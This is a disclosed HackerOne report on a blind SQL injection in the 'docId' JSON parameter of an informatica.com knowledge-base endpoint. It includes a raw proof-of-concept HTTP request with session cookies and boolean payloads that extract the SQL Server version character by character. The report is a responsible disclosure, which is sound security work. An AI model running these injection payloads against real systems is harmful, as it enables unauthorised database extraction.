# [informatica.com] Blind SQL Injection

## Report Details
- **Report ID**: 117073
- **URL**: https://hackerone.com/reports/117073
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2016-02-18T02:55:55.660Z
- **Disclosed**: 2016-04-19T09:12:33.169Z

## Reporter
- **Username**: konqi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: informatica

## Vulnerability Information
Hi guys!

JSON POST parameter "docId" is vulnerable to Blind SQL Injection attack

PoC (Raw query)

POST /_vti_bin/RatingsCalculator/RatingsCalculator.asmx/CalculateRatings HTTP/1.1
User-Agent: Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.17
Host: kb-test.informatica.com
Accept-Language: ru-RU,ru;q=0.9,en;q=0.8
Accept-Encoding: gzip, deflate
Referer: https://kb-test.informatica.com/KBExternal/pages/infasearch.aspx?k=pew
Cookie: ASP.NET_SessionId=03khmmjpaxvcos45opn2kg55; BIGipServerkb-test-pool=2670002442.22811.0000; WebAnalyticsSessionId2=b600796d-cd0e-4797-9610-872c18063793; kbemail=; mkt_cookie=anonymous; __cdrop=.D1P9XM.; _ga=GA1.2.1961398489.1453319834; _mkto_trk=id:189-ZHZ-794&token:_mch-informatica.com-1452163097365-89988; s_vnum=1458351793680%26vn%3D1; gpv_p14=welcome%20page%3Awelcome; s_ppv=-%2C76%2C76%2C947; s_cc=true; gpv2=kb%3Aproddocsearch; s_nr=1455762795883-Repeat; s_invisit=true; s_sq=informatica-mysupport-dev%3D%2526pid%253Dhttps%25253A%25252F%25252Fkb.informatica.com%25252F_layouts%25252FProductDocumentation%25252FPage%25252FProductDocumentSearch.aspx%2526oid%253Dhttps%25253A%25252F%25252Fkb.informatica.com%25252F_layouts%25252FProductDocumentation%25252FPage%25252FProductDocumentSearch.aspx%252523%2526ot%253DA; wooTracker=vALSmwIXvuQp; AMCV_C0B11CFE5330AAFD0A490D45%40AdobeOrg=793872103%7CMCIDTS%7C16850%7CMCMID%7C49728577452301121918884624029572688913%7CMCAAMLH-1456367601%7C6%7CMCAAMB-1456367601%7CNRX38WO0n5BH8Th-nqAG_A%7CMCAID%7CNONE; mbox=check#true#1455762863|session#1455762802845-749291#1455764663
Connection: Keep-Alive
Content-Length: 117
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Content-Type: application/json;charset=utf-8

{docId:"1 and (select substring(@@version,1,1))='M'", docTitle:'Getting an error while trying to import WSDL as...' }

for a TRUE query we get - {"d":"3"}
for a FALSE - {"d":""}
for a Syntax error - {"Message":"There was an error processing the request.","StackTrace":"","ExceptionType":""}

so using this blind technique we can extract the data from Database

examples

docId:"1 and (select substring(@@version,1,1))='M'" - true
docId:"1 and (select substring(@@version,2,1))='i'" - true
docId:"1 and (select substring(@@version,3,1))='c'" - true

docId:"1 and (select substring(@@version,22,1))='2'"
docId:"1 and (select substring(@@version,23,1))='0'"
docId:"1 and (select substring(@@version,24,1))='0'"
docId:"1 and (select substring(@@version,25,1))='8'"

and so on.. . So we have a MS SQL Server 2008

## Attachments
No attachments
